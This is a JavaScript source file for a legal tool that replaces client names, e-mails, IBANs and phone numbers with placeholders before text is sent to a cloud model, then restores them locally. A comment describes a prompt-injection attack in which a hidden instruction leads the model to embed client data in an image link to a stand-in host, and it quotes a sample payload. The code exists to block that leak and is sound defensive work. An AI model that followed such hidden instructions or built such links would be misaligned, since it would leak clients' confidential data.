"use strict"
/**
 * Redact-before-send — pseudonymise client data for cloud model calls.
 *
 * Before a request leaves the machine, sensitive strings are replaced with
 * stable placeholders ([[PARTY_1]], [[EMAIL_2]] …); the reply is restored
 * locally, so the lawyer sees real names and the provider never does.
 *
 * What gets replaced:
 *   - the matter's terms: client, parties, people (matters.js redactTerms + client)
 *   - patterns: e-mail addresses, IBANs, phone numbers, card-like numbers
 *
 * Deterministic, local, no model involved. It is a strong default, not a
 * guarantee: names the lawyer didn't list and indirect identifiers can
 * still leave — the UI says so.
 */

const PATTERNS = [
  { kind: 'EMAIL', re: /\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b/gi },
  { kind: 'IBAN', re: /\b[A-Z]{2}\d{2}(?:[ ]?[A-Z0-9]{4}){2,7}(?:[ ]?[A-Z0-9]{1,4})?\b/g },
  { kind: 'CARD', re: /\b(?:\d[ -]?){13,19}\b/g },
  { kind: 'PHONE', re: /(?<![\w])\+?\d{1,3}[ /.-]?\(?\d{1,4}\)?(?:[ /.-]?\d{2,4}){2,4}(?!\d)/g },
]

const escapeRe = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')

// Placeholders inside a web address are never restored (prompt injection):
// an instruction hidden in a document can make the model build a link or an
// image address from client data ("![](https://x.example/?d=[[PARTY_1]])").
// Restoring it would put the real name into the address, which a front end
// or a web tool could then send out. Kept as a placeholder, it carries
// nothing. An address runs from its scheme (or "www.", "mailto:", a
// Markdown link target "](") up to the next space, quote or angle bracket.
const URL_CONTEXT = 2048
const URL_START_RE = /[a-z][a-z0-9+.-]*:\/\/|\bwww\.|\bmailto:|\]\(/gi
function insideUrl(text) {
  const spans = []
  for (const m of text.matchAll(URL_START_RE)) {
    const rest = text.slice(m.index).match(/^[^\s<>"'`]*/)[0]
    spans.push([m.index, m.index + rest.length])
  }
  return (i) => spans.some(([a, b]) => i >= a && i < b)
}

class Redactor {
  constructor(terms = []) {
    // Longest first so "Acme Holding GmbH" wins over "Acme".
    this.terms = [...new Set(terms.map((t) => String(t || '').trim()).filter((t) => t.length >= 2))].sort((a, b) => b.length - a.length)
    this.toPlaceholder = new Map() // lower-cased original → placeholder
    this.toOriginal = new Map() // placeholder → original (first spelling seen)
    this.counts = {}
  }

  _placeholder(kind, original) {
    const key = `${kind}:${original.toLowerCase()}`
    if (this.toPlaceholder.has(key)) return this.toPlaceholder.get(key)
    this.counts[kind] = (this.counts[kind] || 0) + 1
    const ph = `[[${kind}_${this.counts[kind]}]]`
    this.toPlaceholder.set(key, ph)
    this.toOriginal.set(ph, original)
    return ph
  }

  redact(text) {
    let out = String(text ?? '')
    // Patterns first: a party name inside an e-mail address must not break it.
    for (const { kind, re } of PATTERNS) {
      out = out.replace(re, (m) => {
        // Phone/card patterns must carry enough digits to be identifiers, not years or § numbers.
        if ((kind === 'PHONE' || kind === 'CARD') && m.replace(/\D/g, '').length < (kind === 'PHONE' ? 8 : 13)) return m
        return this._placeholder(kind, m)
      })
    }
    for (const term of this.terms) {
      const re = new RegExp(`(?<![\\p{L}\\p{N}])${escapeRe(term)}(?![\\p{L}\\p{N}])`, 'giu')
      out = out.replace(re, (m) => this._placeholder('PARTY', m))
    }
    return out
  }

  redactMessages(messages) {
    return messages.map((m) => ({ ...m, content: typeof m.content === 'string' ? this.redact(m.content) : m.content }))
  }

  /**
   * Restore placeholders (also tolerates models dropping one bracket).
   * Never inside a web address (see insideUrl): `before` is the text that
   * came just before (streaming), so an address split across chunks counts.
   */
  restore(text, before = '') {
    if (!this.toOriginal.size) return text
    const s = String(text ?? '')
    const ctx = String(before || '').slice(-URL_CONTEXT)
    const inUrl = insideUrl(ctx + s)
    return s.replace(/\[?\[\[?([A-Z]+_\d+)\]\]?\]?/g, (m, id, off) => (inUrl(ctx.length + off) ? m : this.toOriginal.get(`[[${id}]]`) ?? m))
  }

  /** Wrap a streaming callback: hold back a possibly split placeholder until it is complete. */
  streamRestorer(onContent) {
    let pending = ''
    let sent = '' // the raw text already passed on (for addresses split across chunks)
    return {
      push: (chunk) => {
        pending += chunk
        // Hold back a trailing, not-yet-closed placeholder ("[", "[[PAR", "[[PARTY_1]").
        const tail = pending.match(/\[\[?[A-Z]*(?:_\d*)?\]?$/)
        const cut = tail ? tail.index : pending.length
        const ready = pending.slice(0, cut)
        pending = pending.slice(cut)
        if (ready) { onContent(this.restore(ready, sent)); sent = (sent + ready).slice(-URL_CONTEXT) }
      },
      flush: () => { if (pending) { onContent(this.restore(pending, sent)); sent = (sent + pending).slice(-URL_CONTEXT); pending = '' } },
    }
  }

  get replaced() {
    return this.toOriginal.size
  }
}

/** Redactor for a matter (null when the matter's policy doesn't ask for redaction). */
function forMatter(matterId) {
  const rule = require('./policy').ruleFor(matterId)
  if (!rule.redact) return null
  const m = matterId ? require('./matters').get(matterId) : null
  const terms = [...(m?.redactTerms || []), ...(m?.client ? [m.client] : [])]
  return new Redactor(terms)
}

module.exports = { Redactor, forMatter, insideUrl }
